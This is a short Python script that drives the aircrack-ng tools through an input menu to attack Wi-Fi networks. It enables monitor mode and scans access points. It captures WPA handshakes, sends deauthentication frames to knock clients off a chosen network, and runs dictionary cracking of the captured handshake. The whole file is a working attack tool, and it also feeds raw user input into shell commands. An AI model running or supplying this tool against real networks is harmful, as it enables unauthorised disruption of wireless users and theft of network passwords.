import os
os.system('airmon-ng check kill')
os.system('airmon-ng start wlan0')

while True :

	what = input("Enter option ")

	if what == 'MAC':
		os.system('airodump-ng wlan0mon')
	elif what == 'Users':
		bssid = input("Enter Mac ")
		channel = input("Enter channel " )
		os.system('airodump-ng --bssid {0} --channel {1} wlan0mon'.format(bssid, channel))

	elif what == 'UsersF':
		bssid = input("Enter Mac ")
		channel = input("Enter channel " )
		path = input("Enter path os handshake ")
		os.system('sudo airodump-ng --bssid {0} --channel {2} -w {1} wlan0mon'.format(bssid,path,channel))

	elif what == 'DeAuth':
		bssid = input("Enter Mac ")
		usermac = input("Enter userMac ")
		os.system('aireplay-ng --deauth 20 -a {0} -c {1} wlan0mon'.format(bssid, usermac))
	elif what == 'WpaC':
		pC = input("Enter path of clean handshake ")
		pD = input("Enter path of dirt hand shake ")
		os.system('wpaclean {0} {1}'.format(pC, pD))
	elif what == 'Brooding':
		mac = input("Enter Mac ")
		dic = input("Enter dictionary ")
		Hshake = input("Enter clean handshake ")
		os.system('aircrack-ng -w {0} -b {1} {2}'.format(dic, mac, Hshake))



